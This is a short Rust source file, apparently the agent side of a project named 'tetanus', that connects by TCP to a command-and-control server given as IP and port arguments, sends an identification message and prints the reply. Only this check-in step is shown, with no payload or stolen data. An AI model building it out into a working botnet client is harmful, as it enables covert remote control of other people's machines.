extern crate tetanus;

use tetanus::{Message, MessageKind};
use tetanus::util::parse_arg;

use std::{io, net, env, time};
use std::io::{Read, Write};
use std::process::exit;
use std::str::FromStr;


fn send_msg(mut stream: &net::TcpStream, msg: Message) -> io::Result<()> {
    stream.write(&msg.to_bytes())?;
    Ok(())
}

fn recv_msg(mut stream: net::TcpStream) -> Option<io::Result<Message>> {
    let mut buf: [u8; 128] = [0; 128];

    match stream.read(&mut buf) {
        Ok(_) => Some(Ok(Message::from_bytes(&buf))),
        Err(e) if e.kind() == io::ErrorKind::WouldBlock => None,
        Err(e) => Some(Err(e))
    }
}

fn run() -> Result<(), tetanus::Error> {
    if env::args().len() < 3 {
        return Err(tetanus::Error::Argument)
    } 

    // parse_arg should never return None
    let cnc_ip: net::IpAddr = parse_arg(1).unwrap()?;
    let cnc_port: u16 = parse_arg(2).unwrap()?;

    let cnc = net::TcpStream::connect((cnc_ip, cnc_port))?;
    cnc.set_read_timeout(Some(time::Duration::new(30, 0)))?;

    send_msg(&cnc, Message::from(MessageKind::IDENT))?;
    println!("{:?}", recv_msg(cnc));

    Ok(())
}

fn main() {
    let result = run();

    match result {
        Ok(_)  => exit(0),
        Err(e) => {
            eprintln!("{}", e);
            exit(1)
        }
    }
}